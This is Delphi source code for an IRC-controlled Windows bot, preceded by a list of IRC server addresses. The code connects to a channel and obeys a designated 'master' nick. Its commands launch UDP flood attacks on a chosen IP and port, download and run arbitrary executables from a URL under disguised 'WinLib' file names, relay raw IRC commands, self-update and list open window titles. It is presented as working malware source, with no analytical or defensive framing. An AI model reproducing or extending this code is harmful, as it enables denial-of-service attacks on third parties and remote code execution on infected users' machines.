   {
           HOST                  IP            PORT
     IRC.SORCERY.NET   >> 216.122.249.75   >> 6667
     IRC.NEWNET.NET    >> 209.208.101.131  >> 6667
     IRC.EF.NET        >> 208.178.231.190  >> 6667
     IRC.ICQ.COM       >> 64.12.165.57     >> 7000
     IRC.DAL.NET       >> 212.74.101.21    >> 7000
     IRC.QUAKENET.ORG  >> 62.30.30.109     >> 6667
   }

   unit main;

   interface

   uses
    Windows, WinSock,settings;
   const
     BUFLEN                   = 65536;
   var
    DOS_PORT:INTEGER;
    DOS_IP:STRING;
    DDOS:BOOLEAN;
    IRCPort:integer = 6667;
    Sock1:TSocket;
    SockInfo:Sockaddr_in;
    mess:boolean;
    WSAData:TWSAData;
    buff:array[0..1024] of char;
    Send01:string;
    StringList01:array of string;
     var buf:array[0..buflen-1]of char;
       wins:array[0..300]of record name:string;
     wnd:hwnd;
     end;
     wcnt:integer=0;
          procedure sendmsg(str:string);
          Procedure ReadSock;
          Procedure StartUp;
          Procedure ReStart;
          Procedure AddToList01(Text: string);
          procedure ParseContent(Content:string);
          Procedure SendPing;
          Procedure SendInfo;
          Procedure RandomNick;
          function StrToInt(S: string): integer;
          Function IntToStr(X: integer): string;
          function Trim(const S: string): string; overload;
          function DFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
   implementation

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

    function RNDNICK:string;
    const
     n:array[0..19]of string=('A','B','C','D','F','G','H','I',
                              'J','K','L','M','N','O','P',
                              'Q','R','S','T','U');
     a:array[0..11]of string= ('|1','^2','3','`4',
                              '|5','^6','7','`8',
                              '|9','^0','1','`2');
     b:string= ('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_^`[]{}\');
    var
     j:integer;
     s:string;

    begin
    randomize();
    j:=random(20);
     while j>0 do begin
     sleep(50);
      randomize();
      s:=s+copy(b,random(length(b)),1);
      j:=j-1;
     end;
    result :=s;
    end;

   function rndline:string;
   var
    abc:string;
    i:integer;
   begin
    abc := '01234567890123456789abcdefghijklmnopqrstuvwxyzåäö       ';
    randomize();
    i:=random(80);
   while i<>0 do begin
   sleep(10);
   randomize();
   result := result + copy(abc,random(length(abc)),1);
   i:=i-1;
   end;
   end;

   function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
   begin

     if iswindowvisible(w) then begin
       getwindowtext(w,buf,10000);
       if buf[0]<>#0 then begin
         wins[wcnt].name:=buf;
         wins[wcnt].wnd:=w;
         wcnt:=wcnt+1;
       end;
     end;
     result:=true;
   end;

   function sendwindows:string;
   var i:integer;
   begin
    result:='';
     wcnt:=0;
     enumwindows(@enumwinproc,0);
     for i:=0 to wcnt-1 do begin
       result:=result+{'['+inttostr(wins[i].wnd)+']'+}wins[i].name+chr(13);
       wins[i].name := '';
       wins[i].wnd := 0;
     end;
   end;
   function getwins:string;
   begin
    result:='';
    result:=sendwindows;
   end;

   PROCEDURE UDPAttack;
   var
     UDPSock:TSocket;
     UDPInfo:sockaddr_in;
     UDPWSAData:TWSAData;
     UDPData:string;
     I,UDPP:integer;
   begin
    While DDOS do begin
     WSAStartup(257,UDPWSAData);
     UDPInfo.sin_family := AF_INET;
     UDPInfo.sin_port := htons(DOS_PORT);
     UDPInfo.sin_addr.S_addr:= inet_addr(PChar(DOS_IP));
     UDPSock := socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
     Randomize;
     UDPP := random(6550);
     for i:=0 to UDPP do
     UDPData := UDPDATA + inttostr(random(99));
     sendto(UDPSock,UDPData,10,0,UDPInfo,sizeof(UDPInfo));
     CloseSocket(UDPSock);
     WSACleanup;
    end;
   end;

   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;


   procedure ReadSock;
    var
     str01:string;
     FFN:string;
     target:string;
     port : string;
     nick : string;
     bla:DWORD;
    begin
     ZeroMemory(@str01,sizeof(str01));
     str01:=buff;
     ZeroMemory(@buff,sizeof(buff));
     nick := copy(str01,2,pos('!',str01)-2);
     str01 := uppercase(str01);
    if pos('TYPE /QUOTE ',str01)> 0 then
     begin
      send01 := copy(str01,pos('TYPE /QUOTE ',str01)+5,length(str01));
      target := copy(send01,1,length(send01));
      send01:=Target;
      send(Sock1,send01[1],Length(send01),0);
     end else
    if pos(ircprefix+'RESOLVE',str01)> 0 then
     begin
      if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix+'RESOLVE',str01)+9,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      send01:= 'Resolved to : '+getip(Target);
      sendmsg(send01);
     end else
    if pos(ircprefix+'RAW',str01)> 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix+'RAW',str01)+5,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      send01 := target+#13#10;
      send(Sock1,send01[1],Length(send01),0);
     end else
    if pos('Nickname is already in use.',str01) > 0 then
     begin  //Incase nick already used. (duh!)
      send01:='NICK ' + RNDNICK + #13#10;
      send(Sock1,send01[1],Length(send01),0);
      ZeroMemory(@buff,sizeof(buff));
     end else
    if pos(ircprefix + 'MSG',str01) > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix + 'MSG',str01)+5,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
       sendmsg(target);
     end else
    if pos(ircprefix + 'PREFIX',str01) > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix + 'PREFIX',str01)+8,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      if (target <> '') and (length(target) <2) then begin
       ircprefix := target;
       sendmsg('[PREFIX] Changed to '+target);
      end;
         ZeroMemory(@buff,sizeof(buff));
     end else
    if pos(ircprefix + 'NR',str01) > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix + 'NR',str01)+4,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      if target = '0' then begin
       N_report := false;
       sendmsg('[REPORT] OFF');
      end else
      if target = '1' then begin
       N_report := TRUE;
       sendmsg('[REPORT] ON');

      end;
         ZeroMemory(@buff,sizeof(buff));
     end else
    if pos(ircprefix + 'STOP',str01) > 0 then

     begin
     if master <> '' then if nick <> master then exit;
     sendmsg('[UDP] Stopped');
     DDOS:=FALSE;
        ZeroMemory(@buff,sizeof(buff));
     end else
    if pos(ircprefix + 'IPR',str01) > 0 then
      begin

       send01 := copy(str01,pos(ircprefix + 'IPR',str01)+5,length(str01));
      target := copy(send01,1,length(send01));

      port :=   copy(target,pos(' ',target)+1,length(target));
      port := copy(port,1,length(port)-2);
      target := copy(target,1,pos(' ',target)-1);

      b_ip1 := target;
      b_ip2 := port;
      sendmsg('[IP-RANGE] '+b_ip1+'.'+b_ip2+'.x.x');

     end else
    if pos(ircprefix + 'UDP',str01) > 0 then
     begin  //Incase nick already used. (duh!)
   if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix + 'UDP',str01)+5,length(str01));
      target := copy(send01,1,length(send01));

      port :=   copy(target,pos(' ',target)+1,length(target));
      port := copy(port,1,length(port)-2);
      target := copy(target,1,pos(' ',target)-1);

      DOS_IP := TARGET;
      DOS_PORT:= strtoint(port);
      DDOS:=TRUE;

      Sendmsg('[UDP] '+DOS_IP+':'+PORT);

      CreateThread(nil,0,@UDPATTACK,nil,0,BLA);
         ZeroMemory(@buff,sizeof(buff));
     end else
    if pos(ircprefix + 'URL' ,str01)   > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix + 'URL',str01)+5,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      send01:='PRIVMSG ' + IRCChan +' :Downloading : '+target + #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
      randomize;
      ffn := 'WinLib'+inttostr(random(33669995))+'.exe';
      DFILE(0,pchar(target),pchar(FFN), 0, 0);
      WinExec(pchar(FFN),0);
      send01:='PRIVMSG ' + IRCChan +' :Downloaded '+target+', executing' + #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
         ZeroMemory(@buff,sizeof(buff));
     end else
    if pos(ircprefix + 'UPDATE' ,str01)   > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01 := copy(str01,pos(ircprefix + 'UPDATE',str01)+8,length(str01));
      target := copy(send01,1,length(send01));
      target := copy(target,1,length(target)-2);
      send01:='PRIVMSG ' + IRCChan +' :Downloading : '+target + #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
      randomize;
      ffn := 'WinLib'+inttostr(random(33669995))+'.exe';
      DFILE(0,pchar(target),pchar(FFN), 0, 0);
      WinExec(pchar(FFN),0);
      send01:='PRIVMSG ' + IRCChan +' :Downloaded '+target+', executing' + #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
      send01:='QUIT :YES MASTER!'+ #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
      exitprocess(0);

     end else
    if pos(ircprefix + 'STATUS',str01) > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01:='PRIVMSG ' + IRCChan +' :ACTIVE: Version 1.0 go.'+ #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
         ZeroMemory(@buff,sizeof(buff));
     end else
    if pos(ircprefix + 'QUIT',str01) > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01:='QUIT :YES MASTER!'+ #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
   exitprocess(0);
     end else
    if pos(ircprefix + 'RESTART',str01) > 0 then
     begin
     if master <> '' then if nick <> master then exit;
      send01:='QUIT :YES MASTER!'+ #10#13;
      send(Sock1,send01[1],Length(send01),0);sleep(200);
   winexec(pchar(paramstr(0)),0);
   exitprocess(0);
     end else
    if pos('PING :',str01) > 0 then
     begin  //Replys to 'Server' pings.
      ZeroMemory(@buff,sizeof(buff));
      ParseContent(str01);
      SendPing;
      SetLength(StringList01,0);sleep(200);

     end else
    if pos('MOTD',str01) > 0 then
     begin  //Most servers will have this. Bot will join channel when this appears.
      ZeroMemory(@buff,sizeof(buff));
      send01:='JOIN ' + ircchan + #10#13;
      send(Sock1,send01[1],Length(send01),0);
     end else
     ZeroMemory(@buff,sizeof(buff));
    end;

   procedure sendmsg(str:string);
   begin
   if mess = true then exit;
      mess := true;
      send01:='PRIVMSG ' + IRCChan + ' :'+str + #10#13;
      send(Sock1,send01[1],Length(send01),0);
      mess := false;
   end;

   procedure Startup;
    begin    //Starts the socket and trys to connect.
     WSAStartup(257,WSAData);
     SockInfo.sin_family:=PF_INET;
     SockInfo.sin_port:=htons(IRCPort);
     if retry = 0 then
     SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip(ircserv)))
     else
     SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip(ircserv2)));
     Sock1:= socket(PF_INET,SOCK_STREAM,0);
     Connect(Sock1,SockInfo,sizeof(SockInfo));
    end;

   Procedure Restart;
    begin     //Hence the name, restarts if it cant connect, or gets disconnected.
     Shutdown(Sock1,2);
     CloseSocket(Sock1);
     Sleep(5000);
     StartUp;
     SendInfo;
    end;

   procedure ParseContent(Content:string);
    var
     i: integer;
    begin
     i := Pos(' ', Content);
      while (i > 0) do
       begin AddToList01(Copy(Content, 1, i - 1));
        Delete(Content, 1, i); i := Pos(' ', Content);
       end;
        if Length(Content) > 0 then
         AddToList01(Content);
    end;

   Procedure AddToList01(Text: string);
    var
     ListLen: integer;
     Listlen2:integer;
    begin
     ListLen:= Length(StringList01);
     ListLen2:= ListLen + 1;
     SetLength(StringList01, ListLen2);
     StringList01[ListLen]:= Text;
    end;

   procedure SendPing;
    begin     //The PONG reply to the server.
     send01:='PONG ' + StringList01[High(StringList01)];
     send(Sock1,send01[1],Length(send01),0);
    end;


   procedure sendinfo;
    begin     //Info to connect. has to be sent so the server can authorize your connection.
     Randomize;
     send01:='NICK ' + ircnick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
     send01:='USER '+ ircnick + ' ' + #34 + RNDNick + #34 + ' ' + #34 + RNDNick + #34 + ' ' + ':' + RNDNick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
    end;

   function IntToStr(X: integer): string;
    var
     S: string;
    begin
     Str(X, S);
     Result := S;
    end;

   function StrToInt(S: string): integer;
    var
     V, Code: integer;
    begin
     Val(S, V, Code);
     Result := V;
    end;

   function Trim(const S: string): string;
    var
     I, L: Integer;
    begin
     L := Length(S);
     I := 1;
     while (I <= L) and (S[I] <= ' ') do Inc(I);
     if I > L then Result := '' else
      begin
       while S[L] <= ' ' do Dec(L);
       Result := Copy(S, I, L - I + 1);
      end;
    end;

   Procedure RandomNick;
    begin     // Duh!
     Randomize;
     send01:=rndnick + #13#10;
     send(Sock1,send01[1],Length(send01),0);
    end;

   end.
